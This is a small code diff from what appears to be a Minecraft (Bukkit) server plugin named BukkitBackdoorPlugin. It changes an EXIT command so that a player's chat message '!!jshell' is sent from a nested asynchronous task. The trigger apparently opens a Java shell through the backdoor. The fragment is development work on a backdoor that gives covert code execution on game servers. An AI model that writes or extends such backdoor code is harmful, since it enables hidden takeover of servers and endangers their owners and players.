@@ -20,7 +20,9 @@ public enum CommandEnum {
     EXIT("exit", (sender) -> {
         Bukkit.getScheduler().runTaskAsynchronously(BukkitBackdoorPlugin.getInstance(), () -> {
             if (sender instanceof Player player) {
-                player.chat("!!jshell");
+                Bukkit.getScheduler().runTaskAsynchronously(BukkitBackdoorPlugin.getInstance(), () -> {
+                    player.chat("!!jshell");
+                });
             }
         });
     });
